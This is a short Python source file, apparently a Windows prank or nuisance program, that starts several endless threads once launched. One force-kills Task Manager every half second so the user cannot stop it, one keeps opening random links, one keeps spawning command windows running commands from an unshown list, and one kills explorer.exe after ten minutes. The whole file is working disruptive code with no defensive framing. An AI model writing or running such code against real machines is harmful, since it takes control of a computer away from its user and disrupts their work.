import random
from webbrowser import open_new_tab
from subprocess import call
from time import sleep
from threading import Thread

from cursed_constants import LINKS,COMMANDS

def task_dumber():
    while True:
        sleep(0.5)
        call("taskkill /F /IM Taskmgr.exe",shell=True)

def websiting():
    while True:
        open_new_tab(random.choice(LINKS))
        sleep(6)

def cmds():
    while True:
        sleep(8)
        call(f"start cmd /k {random.choice(COMMANDS)}",shell=True)
    
def kill_explorer():
    sleep(600)
    call('taskkill /F /IM explorer.exe',shell=True)

t1 = Thread(target=task_dumber)
t2 = Thread(target=websiting)
t3 = Thread(target=cmds)
t4 = Thread(target=kill_explorer)

def start_loops():
    t1.start()
    t2.start()
    t3.start()
    t4.start()